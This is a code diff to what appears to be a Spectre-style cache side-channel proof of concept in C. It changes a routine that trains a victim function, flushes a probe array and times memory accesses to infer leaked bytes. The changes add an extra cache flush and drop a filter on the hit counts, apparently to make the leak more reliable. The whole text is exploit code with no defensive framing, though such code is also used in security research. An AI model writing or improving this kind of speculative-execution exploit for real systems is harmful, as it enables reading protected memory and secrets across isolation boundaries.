@@ -145,7 +145,7 @@ int *checkRelativeAddress(int cacheHitThreshold, size_t relativeAddress, int num
     while (num_tries-- > 0) {
         trainingAddress = num_tries % array1_size;
 
-        /* Flush array2[256*(0..255)] from cache */
+        /* Flush array2 */
         for (i = 0; i < 256; i++)
             flush(&array2[i * 512]);
         wait();
@@ -155,6 +155,11 @@ int *checkRelativeAddress(int cacheHitThreshold, size_t relativeAddress, int num
             callVictimCodeWithFlushedCache(trainingAddress);
         wait();
 
+        /* Forget about trainingAddress */
+        for (i = 0; i < 256; i++)
+            flush(&array2[i * 512]);
+        wait();
+
         /* Calling victim code so it loads data to cache */
         callVictimCodeWithFlushedCache(relativeAddress);
 
@@ -162,7 +167,7 @@ int *checkRelativeAddress(int cacheHitThreshold, size_t relativeAddress, int num
         for (i = 0; i < 256; i++) {
             temp = ((i * 167) + 13) & 255;
             time = (int) memaccesstime(&array2[temp * 512]);
-            if (time < cacheHitThreshold && temp != array1[trainingAddress]) {
+            if (time < cacheHitThreshold) {
                 results[temp]++;
             }
         }
